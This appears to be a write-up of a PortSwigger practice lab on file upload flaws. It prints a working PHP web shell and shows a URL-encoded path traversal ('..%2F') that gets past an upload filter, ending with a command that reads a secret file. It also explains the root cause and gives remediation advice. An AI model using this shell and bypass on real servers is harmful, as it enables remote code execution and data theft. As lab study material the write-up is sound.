## Metadata

- **Difficulty:** Practitioner 
- **Category:** File Upload Vulnerabilities
- **Lab URL:** [Lab: Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
- **Date Solved:** 7/5/2026
## Vulnerability Summary

The app prevents server-side script execution in user-accessible directories (`/files/avatars/`) via directory-specific server configurations. However, it fails to appropriately sanitize directory traversal sequences in the file upload mechanism. This allows an attacker to upload a PHP web shell to a parent directory (`/files/`) where the execution restrictions do not apply, leading to Remote Code Execution (RCE).
## Reconnaissance

- After navigating to `url/login` and logging in with credentials `wiener - peter`, we are taken to `url/my-account?id=wiener`, and are presented an option to upload an image as our avatar. Uploading a [PHP web shell](../shell.php) will yield a `200 OK` HTTP response with the message `The file avatars/shell.php has been uploaded.`However, when we send a HTTP request with header `GET /files/avatars/shell.php`, the app returns a `200 OK`, but with the content of the script in the response body as plain text. It seems that the file was uploaded successfully, but it was not executed as a `.php` file.
```html
<html>

<body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
        <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
    </form>
    <pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>

</html>
```
- Try escaping this directory with `../` and modifying the `filename` field within the `Content-Disposition` header in the `POST /my-account/avatar` HTTP request to `filename="../shell.php"`, the app still returns a `200 OK` with the message `The file avatars/shell.php has been uploaded.`It appears that the app has stripped our directory traversal sequence. 
- Same approach as before, but this time, when we URL encoded the `../` sequence to `..%2F` (thus sending a request with `filename="..%2Fshell.php"`), the app returns a `200 OK` with `The file avatars/../shell.php has been uploaded.` The directory traversal sequence has apparently worked. Sending a HTTP request with header `GET /files/avatars/../shell.php` to access our web shell, the server still returns a `200 OK` but this time with a working shell for us to execute our commands. We have successfully uploaded a web shell.
```html
<html>

<body>
    <form method="GET" name="shell.php">
        <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
    </form>
    <pre>
</pre>
</body>

</html>
```
## Exploitation Steps

1. Navigate to `url/login` and login with the credentials `wiener - peter`.
2. Upload the [PHP web shell](../shell.php) like normal. Intercept this request.
3. On the intercepted request in Step 2, modify the `filename` parameter from `filename="shell.php"` to `filename="..%2Fshell.php"`, and send the request again. Observe that the response has a status code of `200 OK` with the response message `The file avatars/../shell.php has been uploaded.`
4. On `url/my-account?id=wiener`, right click on your "avatar" and select "Open Image in New Tab". Intercept this request. On this intercepted request, modify the HTTP header from `GET /files/avatars/shell.php HTTP/1.1` to `GET /files/avatars/../shell.php HTTP/1.1` and send the request. You should receive a `200 OK` HTTP Response. Right click on the response, select "View response in browser", then paste the copied URL onto the website. Observe that you have a working shell.
5. Run `cat /home/carlos/secret` to exfiltrate the contents of the file `/home/carlos/secret`. The app will return a string - this is the "secret". Copy this string and submit, lab is solved.
## Payload Used

`filename="..%2Fshell.php"`
`GET /files/avatars/../shell.php HTTP/1.1`
[PHP web shell](../shell.php)
Command to read the secret string: `cat /home/carlos/secret`.

The `php` web shell is executed when we utilize directory traversal to upload it to a directory that is insecurely not assumed to be user-accessible. The app's input filter strips raw `../` sequences _before_ URL-decoding the input string. By URL-encoding the sequence as `..%2F`, the payload bypasses the initial sanitization filter. The backend filesystem API subsequently decodes the input during the file write operation, executing the traversal sequence and writing the file to the higher-level directory.
## Root Cause

- The application fails to decode and canonicalize the user-supplied `filename` to its absolute form before applying sanitization filters. This order-of-operations flaw allows encoded sequences to bypass validation.
- The server relies on localized, directory-specific configurations (blacklisting execution in `/avatars/`) rather than utilizing a secure file storage architecture (e.g., storing uploads outside the web root or strictly serving them without execution privileges globally).
## Remediation

* Never trust user-supplied filenames. Extract only the file extension, validate it against a strict whitelist, and rename the file to a randomly generated, unpredictable string (e.g., UUID) before saving it. Do not use the original filename in any filesystem operations.
* Uploaded files should be stored in a directory completely outside the web application's document root. This makes direct execution of any uploaded script via HTTP requests impossible. Serve the files via a dedicated application endpoint that retrieves the file and sets a safe `Content-Type` header.
* If files absolutely must be stored within the web root, configure the main web server configuration (avoiding easily bypassed local configurations like `.htaccess`) to disable the execution of server-side scripts for the upload directory and all adjacent/parent directories.
* Ensure any input validation or sanitization mechanisms decode the input to its canonical form before evaluating or stripping malicious sequences like path traversal attempts.